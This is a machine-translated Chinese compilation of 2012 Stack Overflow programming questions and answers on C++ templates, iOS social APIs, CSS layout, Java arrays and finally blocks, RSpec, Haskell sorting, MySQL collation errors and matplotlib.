当查看模板代码与其调用的函数（可能是模板本身）之间的各种交互时，就会出现与模板的交互：当强制代码不被内联时，编译器没有机会避免函数调用的开销。模板使用的抽象通常是非常简单的函数，例如，“增加迭代器”和“取消引用迭代器”映射到底层指针操作，由于函数调用开销和失去优化机会，创建函数调用可能变得相当昂贵. 但是，编译器实际上可以看穿这一点并在许多情况下做出正确的选择。

也就是说，我非常喜欢为某些模板创建显式实例化。例如，从头文件中删除 IOStreams 库的某些部分并在库中显式实例化它会对编译时间产生巨大影响，尤其是在打开优化时： 为整数调用简单的输出函数会导致大量模板被实例化. 将此代码放入其自己的文件并使用适当的优化选项对其进行编译可能不会对性能产生太大影响，但它确实对编译时间产生重大影响。但是，这可能会对性能产生间接影响：您可以负担更多的迭代来测试使用该库的代码的性能。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T15:16:04.600

即使您显式声明了一个函数，因为`inline`不能保证 C++ 会成功`inline`，那么您如何认为在标头中实现一个模板会强制`inline`实现并给您带来一些问题？

在几乎所有情况下，您都不需要第二种情况，尽管您可以这样做，但不需要避免`inline`问题

# iphone - < iOS 5 的 Twitter 和 Facebook API

> ID：12760745
> 
> 赞同：0
> 
> 时间：2012-10-06T14:37:55.807
> 
> 标签：iphone, ios, facebook, deployment, twitter

我一直想知道是否可以使用新的 iOS 版本内置的新 Twitter 和 Facebook 框架发布应用程序，但仍然能够部署到旧的 iOS 版本，如果iOS版本不正确？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-06T16:59:34.073

在 iOS 6 中，您可以像这样轻松集成两者。例子

```
- (IBAction)Facebook:(id)sender
{

    if([SLComposeViewController isAvailableForServiceType:SLServiceTypeFacebook]) {

        SLComposeViewController *controller = [SLComposeViewController composeViewControllerForServiceType:SLServiceTypeFacebook];

        SLComposeViewControllerCompletionHandler myBlock = ^(SLComposeViewControllerResult result){
            if (result == SLComposeViewControllerResultCancelled) {

                NSLog(@"Cancelled");

            } else

            {
                NSLog(@"Done");
            }

            [controller dismissViewControllerAnimated:YES completion:Nil];
        };
        controller.completionHandler =myBlock;

        [controller setInitialText:@""];

        [self presentViewController:controller animated:YES completion:Nil];
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-06T15:05:41.073

您可以使用 Twitter 和 Facebook 发布应用程序，但在调用 API 之前，您需要始终检查运行应用程序的设备的 iOS 版本。您的应用在旧 iOS 版本中将没有这些功能。

覆盖 iOS 5.0 及更高版本并不是一个坏主意，因为在 2012 年 6 月，Apple 表示超过 80% 的设备安装了 iOS 5。您可以在本[主题演讲](http://www.apple.com/apple-events/june-2012/)的第 69 分钟看到它。

有关设备列表和支持的 iOS 版本，您可以阅读[此](http://en.wikipedia.org/wiki/List_of_iOS_devices#Models)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-12T18:31:22.180

我建议您使用[Facebook SDK for iOS](https://developers.facebook.com/ios)，它提供了对操作系统支持的抽象级别。

如果配置正确（例如，根据[此处](https://developers.facebook.com/docs/tutorial/iossdk/upgrading-from-3.0-to-3.1/)将新框架标记为可选），它将在旧版本的操作系统上运行，并在需要时回退到替代 FB 身份验证方法，例如通过 FB 应用程序或 web 视图。

# css - CSS：使元素填充浏览器宽度，同时保持其他元素以定义的宽度居中

> ID：12760750
> 
> 赞同：1
> 
> 时间：2012-10-06T14:38:46.973
> 
> 标签：css, position

我正在尝试在 CSS 中创建以下布局：

![在此处输入图像描述](../Images/b64ef25e86c1e8055cb53e392d441c84.png)

这是一个典型的 Web 布局，其中所有内容都在一个包装器 DIV 中，该 DIV 具有定义的宽度并以页面为中心。

但是，紫色背景是 CSS 渐变，需要填充浏览器的整个宽度（而不仅仅是内容包装器的宽度）。此外，不同的页面会有不同的标题/介绍文本行（例如，一些页面可能有 3 行，其他只有 1 行），因此紫色背景需要与此内容的高度相匹配。

我还使用了一个 CMS，它将所有内容放在一个具有宽度并以`margin:auto`.

如何实现布局？

起初我虽然可以`position:absolute`在标题/介绍 div 上使用。这很好用。除了其余内容隐藏在标题/介绍 div 后面。在此处查看示例：http: [//jsfiddle.net/5BkX6/1/](http://jsfiddle.net/5BkX6/1/)

然后我尝试`position:relative`在标题/介绍 div 上使用，然后使用负左值和填充来拉伸 DIV 的背景，同时保持内容居中。在此处查看示例：http: [//jsfiddle.net/4DZYr/1/](http://jsfiddle.net/4DZYr/1/)

这种方法效果很好，除了它创建了一个水平滚动条。我知道我可以将 overflow-x:hidden 应用于主包装器 DIV 以隐藏滚动条，但我不希望一开始就拥有它。

我怎样才能实现我的目标。我不想使用 jquery 来获取标题/介绍 DIV 的高度。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T14:45:00.137

这应该给你你想要的布局^^这是Html

```
<body>
<div class="header">
<div class="contentheader">This is the header</div>
</div>
<div class="container">
   <div class="content">
      <div class="left"></div>
      <div class="right"></div>
   </div>
</div>
</body> 
```

这是风格

```
.header{
width : 100%;
background : #0033aa;
height : 100px;
}
.contentheader{
width : 1000px;
margin : 0 auto;
}
.container{width : 100%;
}
.content{
width : 1000px;
margin : 0 auto;
}
.left {
width : 300px;
display : inline-block;
height : 200px;
background : #3300aa;}
.right{
width : 700px;
display : inline-block;
height : 200px;
background : #aa0033;} 
```

# java - 为什么我的主课在我的日历课中看不到数组

> ID：12760751
> 
> 赞同：1
> 
> 时间：2012-10-06T14:38:51.700
> 
> 标签：java

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T14:54:47.680

您的 main 方法不知道是什么`events`，因为范围内没有名为 events 的局部变量，主类上也没有名为 events 的静态变量。您需要告诉它您正在查找特定日历对象中的事件对象，如下所示：

```
System.out.println(calendarObject.events[0]); 
```

这假设您的两个类在同一个包中，或者两者都没有声明包（因此它们都在默认包中）。如果这两个类位于不同的包中，则您必须将实例成员公开为公共或创建一个公共方法来访问它以供另一个查看它。

基于类的对象的想法是您可以使用一个类来创建多个对象。由于您只创建了日历类的一个对象，因此在此作业中可能不会很好地理解这一点。要引用对象的成员，您需要指定要在哪个对象中查找该成员。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-06T14:45:31.580

首先，它说不要硬编码大小，使用常量。所以像这样制作一个常量：

```
private static final int ARRAY_SIZE = 5; 
```

并将您的声明更改为

```
String[] events = new String[ARRAY_SIZE]; 
```

并且在初始化数组时，使用 for-counter 循环将每个插槽设置为“-未计划事件-”，而不仅仅是 {一些“-未计划事件”}，因为这不是动态的，并且不会随着您的恒定大小而改变。

此外，在您的构造函数中删除类型声明

`String[] events`->`events`

通过声明类型，您创建了一个新的局部变量，而不是修改字段，因此数组中的插槽仍然为空，因为您从未修改它们，而是修改了此局部变量中的字段。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-06T16:33:56.300

您`events`在构造函数中声明了一个本地数组，因此默认值`No event planned`没有分配给您的实例变量`events`，它应该是

```
public calender() {
    //Initializes your events array

    events = { "-No event planned-",
               "-No event planned-",
               "-No event planned-",
               "-No event planned-",
               "-No event planned-"};

    //end calender class constructor
} 
```

希望它有效

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-10-06T17:15:55.890

```
import java.util.Scanner;

//begin class driver       
public class driver {

/**
 * @paramargs the command line arguments
 */
//begin main method
    public static void main(String[] args) {
    //initiates scanner
        Scanner userInput = new Scanner (System.in);

    //declare variables
    int dayOfWeek;
    String userEvent;

    //creates object for calender class
    calender calenderObject = new calender();
    calender.fillArray();

    //user prompt
    System.out.println("Enter day of week for your event in the following format:");
    System.out.println("Enter 1 for Monday");
    System.out.println("Enter 2 for Tuesday");
    System.out.println("Enter 3 for Wednsday");
    System.out.println("Enter 4 for Thursday");
    System.out.println("Enter 5 for Friday");
    System.out.println("Enter -1 to quit");

    //collect user input
    dayOfWeek = userInput.nextInt(); 

    //user prompt
    System.out.println("Please type in the name of your event");

    //collect user input
    userEvent = userInput.next();

    //begin while loop
    while (dayOfWeek != -1) {
        if ((dayOfWeek>=1) && (dayOfWeek<=5)){
            calenderObject.createEvent(dayOfWeek, userEvent,dayOfWeek);
            for (int i=0;i<calender.length;i++){
                System.out.println(calender.events[i]);
            }
            dayOfWeek = userInput.nextInt();

            if  (dayOfWeek == -1){
                for (int i=0;i<calender.length;i++){
                    System.out.println(calender.events[i]);
                }
                System.exit(0);
            }
            System.out.println("Please type in the name of your event");    
            userEvent = userInput.next();
        } else{
            System.out.println("You have entered an invalid number");
            System.out.println("Press -1 to quit or enter another day");
            System.out.println("Enter 1 for Monday");
            System.out.println("Enter 2 for Tuesday");
            System.out.println("Enter 3 for Wednsday");
            System.out.println("Enter 4 for Thursday");
            System.out.println("Enter 5 for Friday");
            System.out.println("Enter -1 to quit");
            dayOfWeek = userInput.nextInt(); 
        }
    }

    //end main method
} 
```

}

```
 //begin calender class
public class calender {

    static int length = 5;
    static String[] events = new String[length];

    public static String[] fillArray(){
        for (int i=0; i< length;i++){
            events[i] = "-No event planned-";
        }
        return events;
    }

    //begin createEvent method
public String[] createEvent(int l, String userEvent, int dayOfWeek){
    int t = l;
        if(t%5 == 1 ){
            events[0] = ("Monday Appoinment: ") + userEvent;
        } else if(t%5 == 2 ){
            events[1] = ("Tuesday Appoinment: ") + userEvent;
        } else if(t%5 == 3 ){
            events[2] = ("WednsdayAppoinment: ") + userEvent;
        } else if(t%5 == 4){
            events[3] = ("Thursday Appoinment: ") + userEvent;
        } else if(t%5 == 0 ){
            events[4] = ("Friday Appoinment: ") + userEvent;
        }        
        return events;
    }

//end calender class    
} 
```

# ruby-on-rails - 使用 RSpec 测试嵌套资源会导致奇怪的失败

> ID：12760755
> 
> 赞同：0
> 
> 时间：2012-10-06T14:39:30.827
> 
> 标签：ruby-on-rails, ruby, testing, rspec

我写这个来测试我的控制器使用嵌套资源的创建操作。我有一个带有`has_many :users`关联的 Account 模型。注册后，将创建一个具有单个用户的帐户。

```
 describe "POST #create", focus: true do
    let(:account) { mock_model(Account).as_null_object }

    before do
      Account.stub(:new).and_return(account)
    end

    it "creates a new account object" do
      account_attributes         = FactoryGirl.attributes_for(:account)
      user_attributes            = FactoryGirl.attributes_for(:user)
      account_attributes[:users] = user_attributes

      Account.should_receive(:new).with(account_attributes).and_return(account)
      post :create, account: account_attributes
    end
  end 
```

这是我得到的失败输出；注意预期和得到之间的区别：它在得到一个字符串时期望一个符号。

```
1) AccountsController POST #create creates a new account object
     Failure/Error: Account.should_receive(:new).with(account_attributes).and_return(account)
       <Account(id: integer, title: string, subdomain: string, created_at: datetime, updated_at: datetime) (class)> received :new with unexpected arguments
         # notice that expected has symbols while the other users strings...
         expected: ({:title=>"ACME Corp", :subdomain=>"acme1", :users=>{ ... }})
              got: ({"title"=>"ACME Corp", "subdomain"=>"acme1", "users"=>{ ... }})
     # ./spec/controllers/accounts_controller_spec.rb:34:in `block (3 levels) in <top (required)>' 
```

我不禁注意到这段代码也有点味道。我不知道我是否正确。我是 RSpec 的新手，所以如果你能对我的努力提供一些反馈，我会加分。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-06T14:54:34.583

`params`哈希通常包含字符串而不是符号的键。虽然我们确实使用符号访问它们，但这是因为它是一个[具有无关访问的 Hash](http://as.rubyonrails.org/classes/HashWithIndifferentAccess.html)，它不关心它是使用字符串还是符号访问。

为了让您的测试通过，您可以在设置期望值时使用散列[`stringify_keys`](http://rails.rubyonrails.org/classes/ActiveSupport/CoreExtensions/Hash/Keys.html#M000902)上的方法。`account_attributes`然后，当 Rspec 比较哈希时，两者都将是字符串键控的。

* * *

现在，关于您提出的评论：*实例化*帐户真的是您对控制器的期望吗？如果您将断言/期望放在更具体的、外部可见的行为上，而不是放在对象应该使用的每种方法上，那么您的测试将不那么脆弱。

Rails 控制器通常很难测试，因为有许多等效的方法来操作 ActiveRecord 模型...我通常尝试使我的控制器尽可能愚蠢，并且我不会对它们进行单元测试，让它们的行为被覆盖更高级别的集成测试。

# c# - 将自定义集合转换为 DataRow

> ID：12760758
> 
> 赞同：3
> 
> 时间：2012-10-06T14:40:08.127
> 
> 标签：c#, devexpress, datarow, xtragrid

我尝试将值从自定义集合传递给 DataRow 类型变量，如下面的代码：

```
GridHitInfo downHitInfo = null;
DataRow row = gridView3.GetDataRow(downHitInfo.RowHandle); 
```

但据我所知，如果视图的数据源是对象的自定义集合，则该`GetDataRow`方法返回`null`（Visual Basic 中为 Nothing）。如果视图的数据由`System.Data.DataTable`or提供`System.Data.DataView object`，`System.Data.DataRow object`则返回表示特定行的值。”

XPCollection 是“对象的自定义集合”。

有什么方法可以让我从中获得价值

```
gridView3.GetDataRow(downHitInfo.RowHandle)? 
```

有没有转换器或需要的东西？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-08T06:01:06.470

当底层 Grid 的数据源不是 DataTable 或 DataView 时，您无法获取 DataRow 对象。当数据源的类型是 XPCollection 时，您应该使用[GetRow()](http://documentation.devexpress.com/#WindowsForms/DevExpressXtraGridViewsBaseColumnView_GetRowtopic)方法而不是[GetDataRow()](http://documentation.devexpress.com/#WindowsForms/DevExpressXtraGridViewsBaseColumnView_GetDataRowtopic)方法来获取与网格行对应的对象：

```
var xpCollection = new XPCollection<Person>();
gridControl1.DataSource = xpCollection;
//...
Person person = (Person)gridView1.GetRow(rowHandle); 
```

# java - 使用 foreach 打印多维数组

> ID：12760765
> 
> 赞同：15
> 
> 时间：2012-10-06T14:40:45.740
> 
> 标签：java, multidimensional-array, foreach

如何在java中使用for-each循环打印多维数组？我试过了，foreach 适用于普通数组但不适用于多维数组，我该怎么做？我的代码是：

```
class Test
{
   public static void main(String[] args)
   {
      int[][] array1 = {{1, 2, 3, 4}, {5, 6, 7, 8}};
      for(int[] val: array1)
      {
        System.out.print(val);
      }
   } 
} 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-10-06T14:44:21.933

您的循环将通过打印每个子数组的地址来打印它们。给定内部数组，使用内部循环：

```
for(int[] arr2: array1)
{
    for(int val: arr2)
        System.out.print(val);
} 
```

数组没有可以`String`打印所有元素的表示形式。您需要明确打印它们：

```
int oneD[] = new int[5];
oneD[0] = 7;
// ...

System.out.println(oneD); 
```

输出是一个地址：

```
[I@148cc8c 
```

但是，库*确实*[`deepToString`](https://docs.oracle.com/javase/7/docs/api/java/util/Arrays.html#deepToString(java.lang.Object[]) "deepToString")为此目的提供了方法，因此这也可能适合您的目的：

```
System.out.println(Arrays.deepToString(array1)); 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-10-06T14:52:40.100

如果只想将 int 数组中包含的数据打印到日志中，可以使用

```
Arrays.deepToString 
```

它不使用任何 for 循环。

工作代码。

```
import java.util.*;
public class Main
{
   public static void main(String[] args)
   {
      int[][] array = {{1, 2, 3, 4}, {5, 6, 7, 8}};
        System.out.println(Arrays.deepToString(array));
   } 
} 
```

输出

```
[[1, 2, 3, 4], [5, 6, 7, 8]] 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-10-06T14:49:24.970

这是一种非常通用的方法，适用于大多数语言。您将不得不使用嵌套循环。外循环访问数组的行，而内循环访问该行中的元素。然后，只需将其打印出来并为每一行开始一个新行（或选择您想要打印的任何格式）。

```
for (int[] arr : array1) {
  for (int v : arr) {
    System.out.print(" " + v);
  } 
  System.out.println();
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-10-06T14:44:19.187

当前输出看起来像：

```
[I@1e63e3d
... 
```

它显示了整数数组的字符串表示形式。

您可以`Arrays.toString`用来显示数组内容：

```
for (int[] val : array1) {
   System.out.println(Arrays.toString(val));
} 
```

# jquery - 受苹果启发的 jQuery SWITCH 不会约束圆角

> ID：12760777
> 
> 赞同：0
> 
> 时间：2012-10-06T14:43:06.333
> 
> 标签：jquery, css, jquery-animate

这个小提琴：

[http://jsfiddle.net/e7rGM/40/](http://jsfiddle.net/e7rGM/40/)

包含一个受苹果启发的开关。由于元素定位的性质，一旦动画功能被动画化，它将不会限制内部元素的圆角。有没有办法强制。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T14:57:25.403

You can take a look one of the answers from this post, which suggests using `Webkit CSS Mask`.

[How to make CSS3 rounded corners hide overflow in Chrome/Opera](https://stackoverflow.com/questions/5736503/how-to-make-css3-rounded-corners-hide-overflow-in-chrome-opera)

This seems to fix your problem. Here's the updated fiddle: [http://jsfiddle.net/e7rGM/42/](http://jsfiddle.net/e7rGM/42/)

# css - 打印网页

> ID：12760778
> 
> 赞同：0
> 
> 时间：2012-10-06T14:43:11.500
> 
> 标签：css, printing

我有一个网页，其中包含一个动态填充的表格。此页需要打印出来作记录。我遇到的问题是避免 tr 内的分页符。我花了很多时间在谷歌上搜索并尝试了很多事情，但我只能生成一个页面，该页面没有在正确的位置中断，因此丢失了一些数据。我有一个小的简单打印 css 页面

```
.noprint{
display: none;
}
.printthis { 
display: block; 
} 
.data table{ 
page-break-inside:avoid;
}
.data tr{
page-break-inside:avoid;
}
.data thead{
display:table-header-group;
}
.data tbody{
display:table-body-group;
page-break-inside:avoid;
}
.data,
.data th,
.data td {
border:1px solid #000;
border-spacing:0;   
border-collapse:collapse; 
}
.data table,th, tbody, tr, td {
background-color:transparent;
padding: 0px;
margin: 0px;
}
a:link:after, #content a:visited:after {
content: " (" attr(href) ") ";
text-decoration: none;
font-size: 90%;
display: none;
}
a[href^="/"]:after {
text-decoration: none;
display: none;
} 
```

我只是想在这张表中打印出我已经完成的结果，我只需要一点帮助就可以让它在正确的位置中断。任何帮助表示赞赏

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T16:25:43.737

尝试插入一个带有额外属性的 CSS

```
media=print

<link type="stylesheet" href="../css path" media="print"> 
```

现在使用该选项

```
window.print() 
```

只有这个 css 会被激活并且你的打印页面会应用这个 css

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-17T12:22:36.940

是否在所有浏览器中拆分行？

我遇到了类似的问题：

```
tr {page-break-inside:avoid;} 
```

为我工作，但你似乎已经有了这个。
也许您的 css 规则没有覆盖行，请尝试使用您选择的浏览器中的开发人员工具栏来检查表格行的应用 css 规则。

至于在每页顶部打印表格标题，目前看来 IE 是唯一支持此功能的浏览器。
基于 web-kit 的浏览器目前不支持它：
[Bug 17205 - THEAD & TFOOT 应该打印在每一页上](https://bugs.webkit.org/show_bug.cgi?id=17205)

# c - 不断收到堆栈粉碎错误

> ID：12760779
> 
> 赞同：0
> 
> 时间：2012-10-06T14:43:33.683
> 
> 标签：c

我有一个大小为 101 的缓冲区

```
 char buffer[101] 
```

我正在尝试将地址复制到数组

```
 int i;
 for(i=0;i<sizeof(buffer);i+=4)
     *(long*)&buffer[i] = address 
```

其中地址是long类型。

但是，当我运行它时，我遇到了堆栈粉碎检测。知道为什么吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-06T14:47:49.257

除了对齐问题，

```
 for(i=0;i<sizeof(buffer);i+=4)
     *(long*)&buffer[i] = address 
```

当`i == 100`你写过去分配的缓冲区时。你应该在`i > sizeof buffer - 4`.

# sorting - 简化选择排序和归并排序

> ID：12760787
> 
> 赞同：1
> 
> 时间：2012-10-06T14:44:45.047
> 
> 标签：sorting, haskell, implementation, mergesort, simplify

我已经设法在几行中实现了插入排序和快速排序，但是选择排序和合并排序仍然让我头疼；）

```
selectionsort [] = []

selectionsort (x:xs) =
    let (minimum, greater) = extractMinimum x [] xs
    in  minimum : selectionsort greater

extractMinimum minimumSoFar greater [] = (minimumSoFar, greater)

extractMinimum minimumSoFar greater (x:xs)
    | x < minimumSoFar = extractMinimum x (minimumSoFar:greater) xs
    | otherwise        = extractMinimum minimumSoFar (x:greater) xs 
```

是否有类似`extractMinimum`标准库中可用的功能？我试着兜售`(a -> a -> Bool/Ordering) -> [a] -> (a, [a])`没有任何运气。

```
mergesort [ ] = [ ]

mergesort [x] = [x]

mergesort xs =
    let (left, right) = splitAt (length xs `div` 2) xs
    in  merge (mergesort left) (mergesort right)

merge xs [] = xs

merge [] ys = ys

merge xxs@(x:xs) yys@(y:ys)
    | x < y     = x : merge  xs yys
    | otherwise = y : merge xxs  ys 
```

同样，我必须自己编写`merge`，还是可以重用现有组件？Hoogle 没有给我任何有用的结果`(a -> a -> Bool/Ordering) -> [a] -> [a] -> [a]`。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T15:44:37.283

标准库中没有任何内容，但至少[`merge`](http://hackage.haskell.org/packages/archive/data-ordlist/0.4.5/doc/html/Data-List-Ordered.html#v%3amerge)由[hackage](http://hackage.haskell.org)上的包提供，尽管我不确定是否值得为这样一个简单的函数引入依赖项。

然而，

```
merge xxs@(x:xs) yys@(y:ys)
    | x < y     = x : merge  xs yys
    | otherwise = y : merge xxs  ys 
```

产生一个不稳定的排序，要获得一个稳定的排序，放置的条件`x`应该是`x <= y`.

对于`extractMinimum`，我也没有找到任何东西，但我可以提供一个替代定义，

```
extractMinimum :: Ord a => a -> [a] -> (a,[a])
extractMinimum x = foldl' select (x, [])
  where
    select (mini, greater) y
      | y < mini  = (y, mini:greater)
      | otherwise = (mini, y:greater) 
```

一个很好的定义`selectionSort`是

```
import Data.List -- for unfoldr

selectionSort :: Ord a => [a] -> [a]
selectionSort = unfoldr getMin
  where
    getMin [] = Nothing
    getMin (x:xs) = Just $ extractMinimum x xs 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T16:28:47.273

我对选择排序的建议：

```
import Data.List

selectionsort xs = unfoldr f xs where
    f [] = Nothing
    f xs = Just $ extractMinimum xs

extractMinimum (x:xs) = foldl' f (x,[]) xs where
  f (minimum, greater) x | x < minimum = (x, minimum : greater)
                         | otherwise = (minimum, x : greater) 
```

# java - 为什么在 try catch finally 中，返回的总是 finally ？

> ID：12760788
> 
> 赞同：4
> 
> 时间：2012-10-06T14:44:47.567
> 
> 标签：java

`return A`我的 catch 块中的代码会发生什么？

```
public class TryCatchFinallyTest {

    @Test
    public void test_FinallyInvocation()
    {
        String returnString = this.returnString();
        assertEquals("B", returnString);
    }

    String returnString()
    {
        try
        {
            throw new RuntimeException("");
        }
        catch (RuntimeException bogus)
        {
            System.out.println("A");
            return "A";
        }
        finally
        {
            System.out.println("B");
            return "B";
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-06T14:48:13.890

finally get 在任何返回/退出该方法之前执行。因此，当你这样做

```
return "A"; 
```

它执行如下：

```
System.out.println("B");//Finally block
return "B";//Finally block
return "A";//Return from exception catch 
```

因此返回的是“B”，而不是“A”

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-06T14:53:01.993

也许`return "A";`编译器优化了，也许不是，“A”只是动态替换。事实上，这并不重要，因为您不应该拥有此代码。

这是将 finally 用于控制流问题的经典示例之一：您丢失了一些指令，而另一个编码人员可能看不到“意图”（实际上它只能是错误或恶作剧）。

您可能已经注意到 javac 发出警告*“finally 块未正常完成”*。

**[不要在 finally 子句中返回](http://weblogs.java.net/blog/staufferjames/archive/2007/06/_dont_return_in.html)**

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-06T14:47:58.260

finally 块将始终被执行，而 catch 块仅在捕获到异常时才执行。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-06T14:54:58.057

Finally

You can attach a finally-clause to a try-catch block. The code inside the finally clause will always be executed, even if an exception is thrown from within the try or catch block. If your code has a return statement inside the try or catch block, the code inside the finally-block will get executed before returning from the method.

References [http://tutorials.jenkov.com/java-exception-handling/basic-try-catch-finally.html](http://tutorials.jenkov.com/java-exception-handling/basic-try-catch-finally.html)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-06T14:52:38.493

之前`return "A"`，`finally`block 将被调用，这将被跳过并且`return "B"`你`return "A"`将被跳过并且永远不会被执行。这是因为`finally`块总是在`return`方法的语句之前执行，如果你从`finally`块中返回一些东西，那么你的`return`语句`try/catch`总是会被跳过。

注意：`finally`对于 Java 程序员来说，从块中返回不是一个好习惯。如果您从块中返回某些内容， JAVA 编译器还会向您显示“ **finally 块未正常完成**`finally`”的警告。

# java - 在碧玉报告中使用重音字母

> ID：12760789
> 
> 赞同：1
> 
> 时间：2012-10-06T14:44:48.680
> 
> 标签：java, jasper-reports

我在使用 jasper 报告时遇到重音字母问题，报告的编码是 Cp1252，我使用 JavaBean 来填充它

当我打印它时，字母没问题，但是如果我将它导出为 pdf，带有重音符号的字母将被替换为空格。

我该如何解决？

# mysql - SQL 非法混合排序规则 (utf8_general_ci,IMPLICIT) 和 (latin1_swedish_ci,NUMERIC) 进行操作

> ID：12760794
> 
> 赞同：0
> 
> 时间：2012-10-06T14:45:07.797
> 
> 标签：mysql, mysql-error-1064, collation

Total NOOB 试图解决这个错误。我最近切换了服务器，突然一个曾经完美运行的表/sql查询现在显示以下错误：

> > operation '<>' SQL=SELECT... 的排序规则 (utf8_general_ci,IMPLICIT) 和 (latin1_swedish_ci,NUMERIC) 的非法混合

我在表中有一个结构，其中包括 TIME 字段和 INT 字段。当我将时间字段数据类型切换为 INT 而不是 TIME 时，错误消失了。不幸的是，时间数据也是如此（它显示 0:00）。

SQL 查询如下所示：

```
SELECT
    OverallRank,
    First,
    Last,
    Affiliate,
    Part1Number,
    Part1NumberRank,
    Part2Number,
    Part2NumberRank,
    DATE_FORMAT(Part1Time, '%i:%s') as Part1Time, 
    Part1TimeRank,
    Part3Number,
    Part3NumberRank,
    AgeGroup
FROM
    (SELECT
        First,
        Last,
        Affiliate,
        AgeGroup,
        Part1Number,
        Part2Number,
        Part1Time,
        Part3Number,
        Part1NumberRank,
        Part2NumberRank,
        Part1TimeRank,
        Part3NumberRank,
        (Part1NumberRank + Part2NumberRank + Part1TimeRank + Part3NumberRank) AS Total,
        @overallrank:=CASE WHEN @total <> (Part1NumberRank + Part2NumberRank + Part1TimeRank + Part3NumberRank) THEN @overallrank+1 ELSE @overallrank+0 END AS OverallRank,
        @total:=(Part1NumberRank + Part2NumberRank + Part1TimeRank + Part3NumberRank) AS TTL
    FROM
        (SELECT @overallrank:=0) overallrank,
        (SELECT @total:=0) ttl,
            (SELECT
                First,
                Last,
                Affiliate,
                AgeGroup,
                Part1Number,
                Part2Number,
                Part1Time,
                Part3Number,
                Part1NumberRank,
                Part2NumberRank,
                Part1TimeRank,
                @rank4:=CASE WHEN @Part3Number <> Part3Number THEN @rank4+1 ELSE @rank4+0 END AS Part3NumberRank,
                @Part3Number:=Part3Number AS P4
            FROM
                (SELECT @rank4:=0) r4,
                (SELECT @Part3Number:=0) p4,
                (SELECT
                    First,
                    Last,
                    Affiliate,
                    AgeGroup,
                    Part1Number,
                    Part2Number,
                    Part1Time,
                    Part3Number,
                    Part1NumberRank,
                    Part2NumberRank,
                    @rank3:=CASE WHEN @Part1Time <> Part1Time THEN @rank3+1 ELSE @rank3+0 END AS Part1TimeRank,
                    @Part1Time:=Part1Time AS P3
                FROM
                    (SELECT @rank3:=0) r3,
                    (SELECT @Part1Time:=0) p3,
                    (SELECT
                        First,
                        Last,
                        Affiliate,
                        AgeGroup,
                        Part1Number,
                        Part2Number,
                        Part1Time,
                        Part3Number,
                        Part1NumberRank,
                        @rank2:=CASE WHEN @Part2Number <> Part2Number THEN @rank2+1 ELSE @rank2+0 END AS Part2NumberRank,
                        @Part2Number:=Part2Number AS P2
                    FROM
                        (SELECT @rank2:=0) r2,
                        (SELECT @Part2Number:=0) p2,
                        (SELECT
                            First,
                            Last,
                            Affiliate,
                            AgeGroup,
                            Part1Number,
                            Part2Number,
                            Part1Time,
                            Part3Number,
                            @rank1:=CASE WHEN @Part1Number <> Part1Number THEN @rank1+1 ELSE @rank1+0 END AS Part1NumberRank,
                            @Part1Number:=Part1Number AS P1
                        FROM
                            (SELECT @rank1:=0) r1,
                            (SELECT @Part1Number:=0) p1,
                            (SELECT
                                    *
                            FROM 
                                #__results
                            WHERE
                                EventName = '2011EoSummer' AND
                Gender = {$REQUEST:Gender} AND
                ({$REQUEST:Age} = 'Overall' OR AgeGroup = {$REQUEST:Age})
                ORDER BY 
                                Part1Number DESC
                            ) T1
                        ) T2
                    ORDER BY
                            Part2Number DESC
                    ) T3
                    ORDER BY
                            Part1Time ASC
            ) T4
            ORDER BY
                Part3Number DESC
        ) T5
        ORDER BY 
            Total ASC
    ) T6 
```

任何帮助将不胜感激

我尝试在我的 PHPMyADMIN 中运行查询并得到以下信息：

# 1267 - 非法混合排序规则 (utf8_general_ci,IMPLICIT) 和 (latin1_swedish_ci,NUMERIC) 用于操作 '<>'

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-07T12:04:08.733

这是我的托管公司解决的问题......这是他们联系后的回复。

您当前使用的数据库似乎默认使用服务器的默认信息。这可能发生在帐户移动期间或通过 php 配置。我们准备了一个脚本，您可以运行该脚本来快速更改任何数据库的排序规则。有关更多信息，请参阅以下内容：

[http://www.inmotionhosting.com/support/website/databases/how-to-convert-a-database-to-utf-8](http://www.inmotionhosting.com/support/website/databases/how-to-convert-a-database-to-utf-8)

更新排序规则后，您应该能够运行查询而不会出现任何错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T21:36:37.753

显然，查询中的列/表具有不同的排序规则，对于某些操作是非法的。

尝试将涉及的表/列更改为单个排序规则。

# python - imshow(img, cmap=cm.gray) 显示 128 值的白色

> ID：12760797
> 
> 赞同：16
> 
> 时间：2012-10-06T14:45:24.863
> 
> 标签：python, matplotlib

我正在从 MatLab 转移到 python 并使用 imshow 函数。

我似乎无法理解为什么它没有将值 128 显示为灰色，因为我选择了 cmap 为灰度。

![代码示例](../Images/f41adf375d5ab888efd7944fa4f0ea3e.png)

